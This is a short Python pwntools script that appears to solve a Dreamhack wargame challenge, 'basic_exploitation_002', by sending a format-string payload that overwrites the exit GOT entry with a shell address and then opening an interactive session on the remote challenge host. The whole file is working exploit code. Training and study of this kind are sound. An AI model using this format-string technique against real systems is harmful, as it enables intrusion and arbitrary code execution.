from pwn import *

#p = process("./basic_exploitation_002")
p = remote("host3.dreamhack.games",15919)
e = ELF("./basic_exploitation_002")

pause()
exit_got = e.got["exit"]
shell_low = 0x8609
shell_high = 0x0804

payload = b''
payload += p32(exit_got)
payload += p32(exit_got+2)
payload += b'%'+str(shell_low - 8).encode() +b'c'
payload += b'%1$hn'
payload += b'%' +str(0x10000 + shell_high - shell_low).encode() + b'c'
payload += b'%2$hn'

p.send(payload)
p.interactive()

